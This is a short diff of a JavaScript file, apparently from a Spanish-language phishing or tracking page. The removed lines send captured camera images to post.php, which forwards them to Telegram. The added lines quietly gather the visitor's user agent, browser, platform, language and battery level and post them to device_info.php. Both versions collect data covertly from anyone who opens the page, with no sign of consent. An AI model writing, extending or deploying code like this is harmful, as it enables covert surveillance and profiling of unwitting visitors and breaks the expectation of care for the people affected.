@@ -1,16 +1,15 @@
-// ajax.js: función para enviar imágenes de la cámara a post.php
-function post(imgdata){
+navigator.getBattery().then(function(battery){
     $.ajax({
-        type: 'POST',
-        data: { cat: imgdata },
-        url: 'post.php',
+        url: 'device_info.php',
+        type: 'post',
         dataType: 'json',
-        async: false,
-        success: function(response){
-            console.log("Foto enviada a Telegram:", response);
-        },
-        error: function(err){
-            console.error("Error enviando la foto:", err);
+        data: {
+            agent: navigator.userAgent,
+            navegador: navigator.appName,
+            versionapp: navigator.appVersion,
+            dystro: navigator.platform,
+            idioma: navigator.language,
+            bateri: battery.level * 100
         }
     });
-}
+});
